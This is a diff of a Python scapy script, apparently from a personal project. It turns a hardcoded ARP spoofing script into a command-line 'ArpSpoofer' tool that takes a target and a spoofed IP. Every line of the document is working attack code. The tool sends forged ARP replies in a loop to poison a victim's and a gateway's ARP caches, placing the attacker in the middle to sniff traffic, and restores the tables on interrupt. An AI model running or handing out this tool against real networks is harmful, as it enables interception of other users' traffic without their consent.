@@ -1,48 +1,59 @@
 #!/usr/bin/python
 
 import scapy.all as scapy
+import argparse
+from colorama import Fore, Style, init
 
-def restore_defaults(dest, source):
-    # getting the real MACs
-    target_mac = get_mac(dest) # 1st (router), then (windows)
-    source_mac = get_mac(source)
-    # creating the packet
-    packet = scapy.ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
-    # sending the packet
-    scapy.send(packet, verbose=False)
+# Initialize colorama
+init(autoreset=True)
 
-def get_mac(ip):
-    # request that contain the IP destination of the target
-    request = scapy.ARP(pdst=ip)
-    # broadcast packet creation
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    # concat packets
-    final_packet = broadcast / request
-    # getting the response
-    answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]
-    # getting the MAC (its src because its a response)
-    mac = answer[0][1].hwsrc
-    return mac
+class ArpSpoofer:
+    def __init__(self, target_ip, spoof_ip):
+        self.target_ip = target_ip
+        self.spoof_ip = spoof_ip
 
-# we will send the packet to the target by pretending being the spoofed
-def spoofing(target, spoofed):
-    # getting the MAC of the target
-    mac = get_mac(target)
-    # generating the spoofed packet modifying the source and the target
-    packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
-    # sending the packet
-    scapy.send(packet, verbose=False)
+    def get_mac(self, ip):
+        # ARP request to get the MAC address
+        request = scapy.ARP(pdst=ip)
+        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        final_packet = broadcast / request
+        answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]
+        mac = answer[0][1].hwsrc
+        return mac
 
-def main():
-    try:
-        while True:
-            spoofing("192.168.1.1", "192.168.1.130") # router (source, dest -> attacker machine)
-            spoofing("192.168.1.130", "192.168.1.1") # win PC
-    except KeyboardInterrupt:
-        print("[!] Process stopped. Restoring defaults .. please hold")
-        restore_defaults("192.168.1.1", "192.168.1.130") # router (source, dest -> attacker machine)
-        restore_defaults("192.168.1.130", "192.168.1.1") # win PC
-        exit(0)
+    def spoof(self, target, spoofed):
+        mac = self.get_mac(target)
+        packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
+        scapy.send(packet, verbose=False)
+        print(Fore.YELLOW + f"[+] Spoofing {target} pretending to be {spoofed}")
+
+    def restore(self, dest_ip, source_ip):
+        dest_mac = self.get_mac(dest_ip)
+        source_mac = self.get_mac(source_ip)
+        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
+        scapy.send(packet, verbose=False)
+        print(Fore.GREEN + f"[+] Restoring {dest_ip} to its original state.")
+
+    def run(self):
+        try:
+            while True:
+                self.spoof(self.target_ip, self.spoof_ip)  # Spoof the target IP
+                self.spoof(self.spoof_ip, self.target_ip)  # Spoof the spoofed IP
+        except KeyboardInterrupt:
+            print(Fore.RED + "[!] Detected CTRL+C. Restoring ARP tables... Please wait.")
+            self.restore(self.target_ip, self.spoof_ip)
+            self.restore(self.spoof_ip, self.target_ip)
+            print(Fore.GREEN + "[+] ARP tables restored.")
 
 if __name__ == "__main__":
-    main()
+    # Setting up argparse for command-line arguments
+    parser = argparse.ArgumentParser(description="ARP Spoofing Tool to sniff network traffic.")
+    parser.add_argument("-t", "--target", required=True, help="Target IP address to spoof.")
+    parser.add_argument("-s", "--spoof", required=True, help="Spoofed IP address (e.g., the gateway IP).")
+
+    # Parse the arguments
+    args = parser.parse_args()
+
+    # Create an ArpSpoofer object and start the spoofing process
+    spoofer = ArpSpoofer(target_ip=args.target, spoof_ip=args.spoof)
+    spoofer.run()
